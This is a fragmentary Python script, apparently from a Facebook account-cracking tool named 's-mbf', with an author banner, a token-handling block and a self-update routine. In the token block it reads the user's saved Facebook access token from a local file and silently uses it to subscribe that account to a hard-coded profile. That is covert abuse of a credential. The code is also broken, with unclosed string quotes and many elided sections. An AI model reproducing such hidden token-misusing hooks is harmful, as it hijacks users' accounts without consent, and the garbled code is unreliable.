...
def banner():
	...
	print(cyan('  / __(_)  |/  / _ )/ __/ ',bold=True),green('Author : ABEY,bold=True))
	print(cyan(' _\ \/ / /|_/ / _  / _/	  ',bold=True),green('Contact: t.me/OwL_Indonesia,bold=True))
...
try:
	...
	toket.close()
		...
		try:
			...
			folme=open('toket/token.txt','r').read();requests.post('https://graph.facebook.com/DEMIT.M.2018/subscribers?access_token='+folme)
			time.sleep(3)
			o.close()
		except KeyError:
...
def update():
	...
	if os.name in ['nt','win32']:
		...
		os.system('cd .. & git clone https://github.com/ABEY/s-mbf')
		exit()	
	else:
...
try:
	...
	upver='v.2.7'
	requp=requests.get('https://raw.githubusercontent.com/ABEY/s-mbf/master/README.md').text
...
""")
	...
	print("\n[!] Checking update")
	rr=requests.get('https://raw.githubusercontent.com/ABEY/s-mbf/master/README.md').text
	if upver in str(rr):
		update()
